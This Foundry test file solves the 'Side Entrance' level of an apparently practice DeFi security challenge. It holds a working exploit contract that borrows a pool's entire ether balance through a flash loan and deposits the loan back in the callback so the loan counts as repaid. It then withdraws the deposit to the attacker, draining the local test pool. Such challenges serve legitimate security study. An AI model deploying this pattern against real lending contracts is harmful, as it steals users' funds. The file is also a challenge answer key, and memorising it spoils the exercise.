// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {
    SideEntranceLenderPool,
    IFlashLoanEtherReceiver
} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

contract AttackContruct is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool public pool;
    address public owner;

    constructor(SideEntranceLenderPool _pool, address _owner) {
        pool = _pool;
        owner = _owner;
    }

    function attack() public {
        uint256 balance = address(pool).balance;
        pool.flashLoan(balance);
        pool.withdraw();
        payable(owner).sendValue(balance);
    }

    receive() external payable {}

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;
    AttackContruct public attackContruct;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        attackContruct = new AttackContruct(sideEntranceLenderPool, attacker);

        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploitSideEntrance() public {
        /**
         * EXPLOIT START *
         */
        vm.prank(attacker);
        attackContruct.attack();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
